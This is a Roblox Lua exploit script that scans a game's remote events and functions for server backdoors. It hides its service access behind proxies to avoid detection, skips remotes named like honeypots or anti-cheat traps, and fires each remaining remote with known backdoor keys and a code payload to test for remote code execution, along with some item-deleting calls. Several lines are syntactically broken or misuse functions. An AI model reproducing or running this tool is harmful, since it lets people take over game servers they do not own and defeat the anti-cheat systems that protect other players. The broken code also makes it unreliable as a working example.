-- // Terry's Default initialization
function __UNDETECTED__SERVICE__LOADER__(service: string)
    -- // INITIALIZATION
    local __SERVICE__ORIGINAL__ = game:FindFirstChildWhichIsA(service) or game:GetService(service) -- // FindFirstChildWhichIsA Helps finding services pre-loaded more faster.
    local __SERVICE__PROXY__ = newproxy(true)
    local __METATABLE__ = getmetatable(__SERVICE__PROXY__)
			   
    -- // CREATES NECESSARY METAMETHODS FOR THE NEW PROXY.
    function __METATABLE__:__newindex(key: string, value: any)
        __SERVICE__ORIGINAL__[key] = value
    end
    function __METATABLE__:__index(key: string)
	local __index = __SERVICE__ORIGINAL__[key]
	if type(__index) == "function" then
		return function(self, ...)
			return __index(__SERVICE__ORIGINAL__, ...)
		end
	end
	return __index
    end
    
    -- // LOCKING...
    __METATABLE__.__type = "Instance"
    __METATABLE__.__metatable = "Locked."
	
    if __SERVICE__PROXY__ == __SERVICE__ORIGINAL__ then return "DETECTED_SERVICE" end
    return __SERVICE__PROXY__
end

-- // SOME VARIABLES
local RUN_SERVICE = __UNDETECTED__SERVICE__LOADER__("RunService")
local PLAYERS = __UNDETECTED__SERVICE__LOADER__("Players")
local COREGUI = __UNDETECTED__SERVICE__LOADER__("CoreGui")
local USER_INPUT_SERVICE = __UNDETECTED__SERVICE__LOADER__("UserInputService")
local TWEEN_SERVICE = __UNDETECTED__SERVICE__LOADER__("TweenService")
local HTTP_SERVICE = __UNDETECTED__SERVICE__LOADER__("HttpService")
local STARTER_GUI = __UNDETECTED__SERVICE__LOADER__("StarterGui")
local GUI_SERVICE = __UNDETECTED__SERVICE__LOADER__("GuiService")
local LIGHTING = __UNDETECTED__SERVICE__LOADER__("Lighting")
local CONTEXT_ACTION_SERVICE = __UNDETECTED__SERVICE__LOADER__("ContextActionService")
local REPLICATED_STORAGE = __UNDETECTED__SERVICE__LOADER__("ReplicatedStorage")
local STARTER_PLAYER = __UNDETECTED__SERVICE__LOADER__("StarterPlayer")
local PROXIMITY_PROMPT_SERVICE = __UNDETECTED__SERVICE__LOADER__("ProximityPromptService")
local TEXT_SERVICE = __UNDETECTED__SERVICE__LOADER__("TextService")
local TEXT_CHAT_SERVICE = __UNDETECTED__SERVICE__LOADER__("TextChatService")
local SERVER_PLAYERS = PLAYERS:GetPlayers()
local LOCAL_PLAYER = PLAYERS.LocalPlayer
local CHAR = LOCAL_PLAYER.Character or LOCAL_PLAYER.CharacterAdded:Wait()
local HUM = CHAR:WaitForChild("Humanoid")
local HRP = CHAR:WaitForChild("HumanoidRootPart")

-- // FUCK ADONIS
local CODE = "local TERRY = Instance.new('StringValue', game:GetService('ReplicatedStorage');TERRY.name = '___T3RRY___');"
local HONEYPOT_NAMES = {"Kick", "kick", "Ban", "ban", "KickClient", "BanClient", "KickRemote", "BanRemote", 
                        "Honeypot", "honeypot", "kickclient", "banclient", "kickremote", "banremote",
                        "kick_client", "ban_client", "kick_remote", "ban_remote", "Kick_Client", "Ban_Client",
                        "Kick_Remote", "Ban_Remote", "Admin", "admin", "AntiCheat", "anticheat", "anti_cheat",
                        "Anti_Cheat", "BanPlayer", "KickPlayer", "Ban_Player", "Kick_Player", "kick_player",
                        "ban_player", "BanPlayers", "KickPlayers", "Ban_Players", "Kick_Players", "kick_players",
                        "ban_players", "BanAnticheat", "KickAnticheat", "BanAntiCheat", "KickAntiCheat", 
                        "Ban_AntiCheat", "Kick_AntiCheat", "ban_AntiCheat", "kick_AntiCheat", "ban_anticheat",
                        "kick_anticheat", "Ban_Anti_Cheat", "Kick_Anti_Cheat", "kick_Anti_Cheat", "ban_Anti_Cheat",
                        "kick_anti_cheat", "ban_anti_cheat", "AwardMoney", "KickMe", "BanMe", "kickme", "banme",
                        "kick_me", "ban_me", "Kick_Me", "Ban_Me", "KickUser", "BanUser", "kickuser", "banuser",
                        "kick_user", "ban_user", "Kick_User", "Ban_User"}

function __FILTER__HANDLER__(v: Instance)
  if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") and not (v.Name == "__FUNCTION" or v.Parent.Name == "__FUNCTION" or v:FindFirstChild("__FUNCTION")) then
    if not ((v.Parent.Name == "HDAdminClient" or v.Parent == game:GetService("RobloxReplicatedStorage")) and (v.Parent.Parent.Name == "HDAdminClient" or 
      v.Parent.Parent == game:GetService("RobloxReplicatedStorage")))
      if not v.Parent.Name == "DefaultChatSystemChatEvents" then
        if table.find(v.Name, HONEYPOT_NAMES) then return false end
        return true
      end
      return false
    end
    return false
  end
  return false
end


function __REMOTE__RUNNER__(v: Instance, ...)
  if v:IsA("RemoteEvent") then task.spawn(function() v:FireServer(...) end)
  elseif v:IsA("RemoteFunction") then task.spawn(function() v:InvokeServer(...) end)
  end
end

function __VULNERABILITY__HANDLER__(v: Instance)
  do
		if v.Name == "DestroySegway" then
			__REMOTE__RUNNER__(v, LOCAL_PLAYER:WaitForChild("BackPack"), {Value = LOCAL_PLAYER:WaitForChild("BackPack")})
		else
    	__REMOTE__RUNNER__(v, LOCAL_PLAYER:WaitForChild("BackPack"))
		end 
		task.wait()
		if not LOCAL_PLAYER:FindFirstChild("BackPack") then
			return v, "DELETE"
		end
  end
  do
    __REMOTE__RUNNER__(v, CODE)
    task.wait()
    if REPLICATED_STORAGE["___T3RRY___"] then
      return v, "BACKDOOR"
    end
  end
	do
    __REMOTE__RUNNER__(v, unpack({[1]="5#lGIERKWEF"}), CODE)
    task.wait()
    if REPLICATED_STORAGE["___T3RRY___"] then
      return v, "RUN"
    end
  end
  do
    __REMOTE__RUNNER__(v, unpack({[1]="pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2]=",,,,,,,,,,,,,,," }), CODE)
    task.wait()
    if REPLICATED_STORAGE["___T3RRY___"] then
      return v, "EMMA"
    end
  end
  do
    __REMOTE__RUNNER__(v, unpack({[1]="helpme"}), CODE)
    task.wait()
    if REPLICATED_STORAGE["___T3RRY___"] then
      return v, "HELPME"
    end
  end
  do
    __REMOTE__RUNNER__(v, {[1]="cGlja2V0dA=="}, CODE)
    task.wait()
    if REPLICATED_STORAGE["___T3RRY___"] then
      return v, "PICKETT"
    end
  end
  do
    __REMOTE__RUNNER__(v, {[1]="cGlja2V0dA=="}, CODE)
    task.wait()
    if REPLICATED_STORAGE["___T3RRY___"] then
      return v, "PICKETT"
    end
  end
end
